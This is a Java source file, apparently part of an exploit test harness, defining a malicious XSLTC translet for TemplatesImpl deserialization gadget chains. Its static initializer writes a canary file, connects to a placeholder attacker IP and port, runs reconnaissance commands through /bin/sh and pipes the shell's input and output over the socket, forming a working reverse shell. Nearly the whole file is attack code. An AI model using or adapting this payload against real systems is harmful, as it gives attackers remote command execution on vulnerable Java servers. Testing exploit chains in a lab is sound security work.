import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

/**
 * ShellTranslet — TemplatesImpl defineClass → static init → reverse shell (pure Java).
 * __ATTACKER_IP__ / __ATTACKER_PORT__ are substituted at build time by the runner.
 */
public class ShellTranslet extends AbstractTranslet {
    static final String HOST = "__ATTACKER_IP__";
    static final int PORT = __ATTACKER_PORT__;

    static {
        try {
            new java.io.FileOutputStream("/tmp/canary_rce").write(0x42);
        } catch (Exception ignore) { }
        try {
            final Socket s = new Socket(HOST, PORT);
            final Process p = new ProcessBuilder("/bin/sh", "-c",
                "id; hostname; uname -a; java -version 2>&1 | head -1; echo SHELL-E2E-MARKER")
                .redirectErrorStream(true).start();
            final InputStream pis = p.getInputStream();
            final OutputStream sos = s.getOutputStream();
            final InputStream sis = s.getInputStream();
            final OutputStream pos = p.getOutputStream();
            Thread t1 = new Thread() { public void run() { pump(pis, sos); } };
            Thread t2 = new Thread() { public void run() { pump(sis, pos); } };
            t1.start(); t2.start();
            t1.join(15000); t2.join(1000);
            try { p.destroy(); } catch (Exception ignore) { }
            try { s.close(); } catch (Exception ignore) { }
        } catch (Exception e) {
            try {
                new java.io.FileOutputStream("/tmp/shell_err")
                    .write(e.toString().getBytes());
            } catch (Exception ignore) { }
        }
    }

    static void pump(InputStream in, OutputStream out) {
        try {
            byte[] buf = new byte[4096];
            int n;
            while ((n = in.read(buf)) >= 0) {
                out.write(buf, 0, n);
                out.flush();
            }
        } catch (Exception ignore) { }
    }

    public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) { }
    public void transform(DOM d, SerializationHandler[] h) { }
}
